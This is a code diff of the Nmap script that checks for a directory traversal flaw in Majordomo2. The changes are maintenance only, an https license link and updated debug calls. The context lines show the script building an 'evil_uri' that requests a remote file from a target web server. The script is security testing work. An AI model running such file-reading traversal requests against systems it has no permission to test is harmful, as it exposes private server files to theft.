@@ -37,7 +37,7 @@ For more information about this vulnerability:
 --
 
 author = "Paulino Calderon <calderon@websec.mx>"
-license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
+license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
 categories = {"intrusive", "vuln", "exploit"}
 
 
@@ -72,11 +72,11 @@ action = function(host, port)
   rfile = stdnse.get_script_args("http-majordomo2-dir-traversal.rfile") or DEFAULT_REMOTE_FILE
   evil_uri = uri..MAJORDOMO2_EXPLOIT_QRY..rfile
 
-  stdnse.print_debug(1, "HTTP GET %s%s", stdnse.get_hostname(host), evil_uri)
+  stdnse.debug1("HTTP GET %s%s", stdnse.get_hostname(host), evil_uri)
   response = http.get(host, port, evil_uri)
   if response.body and response.status==200 then
     if response.body:match("unknowntopic") then
-      stdnse.print_debug(1, "%s:[Error] The server is not vulnerable, '%s' was not found or the web server has insufficient permissions to read it", SCRIPT_NAME, rfile)
+      stdnse.debug1("[Error] The server is not vulnerable, '%s' was not found or the web server has insufficient permissions to read it", rfile)
       return
     end
     local _
